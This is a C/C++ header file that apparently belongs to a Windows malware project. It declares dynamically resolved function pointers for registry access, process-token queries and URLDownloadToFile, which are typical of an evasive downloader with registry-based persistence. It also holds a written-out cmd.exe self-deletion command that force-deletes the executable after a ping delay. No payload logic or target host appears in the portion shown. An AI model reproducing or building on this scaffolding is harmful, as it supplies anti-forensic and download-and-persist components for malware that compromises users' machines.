#pragma once


#define _CRT_SECURE_NO_WARNINGS
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


//GetTokenInformation
typedef BOOL(WINAPI* GTI)(
           HANDLE,
               TOKEN_INFORMATION_CLASS,
     LPVOID,
              DWORD,
               PDWORD
    );

// RegQueryValueExW
typedef LSTATUS(WINAPI* RQVE)(
                   HKEY,
        LPCWSTR,
    LPDWORD,
         LPDWORD,
        LPBYTE,
     LPDWORD
    );

// RegEnumValueW
typedef LSTATUS(WINAPI* REVW) (
                  HKEY,
                    DWORD,
                 LPWSTR,
             LPDWORD,
    LPDWORD,
       LPDWORD,
        LPBYTE,
     LPDWORD
    );

// RegOpenKeyExW
typedef LSTATUS(WINAPI* ROKEW)(HKEY, LPCWSTR,DWORD,REGSAM,PHKEY);

// OpenProcessToken
typedef BOOL(WINAPI* OPT)(
     HANDLE,
      DWORD,
     PHANDLE
    );

// RegSetValueExW

typedef LSTATUS(WINAPI* RSVEW)(
              HKEY       hKey,
     LPCWSTR    lpValueName,
    DWORD      Reserved,
               DWORD      dwType,
              const BYTE* lpData,
              DWORD      cbData
);

// RegSetValueExA
typedef LSTATUS(WINAPI* RSVE)(
              HKEY       hKey,
    LPCSTR     lpValueName,
    DWORD      Reserved,
         DWORD      dwType,
              const BYTE* lpData,
             DWORD      cbData
);
//RegCreateKeyExA
typedef LSTATUS(WINAPI* RCKE)(
             HKEY,
                LPCSTR,
    DWORD,
      LPSTR ,
            DWORD ,
                REGSAM ,
     const LPSECURITY_ATTRIBUTES ,
            PHKEY ,
     LPDWORD     
    );

//RegQueryInfoKeyW
typedef LSTATUS(WINAPI* RQIKW)(
               HKEY,
       LPWSTR,
     LPDWORD,
    LPDWORD,
         LPDWORD,
        LPDWORD,
        LPDWORD,
         LPDWORD,
        LPDWORD,
        LPDWORD,
        LPDWORD,
        PFILETIME
    );

// URLDownloadFToFile
typedef HRESULT(WINAPI* dutf)(
    LPUNKNOWN pCaller,
    LPCWSTR szURL,
    LPCWSTR szFileName,
    _Reserved_ DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB
    );

//RegCloseKey
typedef LSTATUS(WINAPI* RCK)(
     HKEY
    );

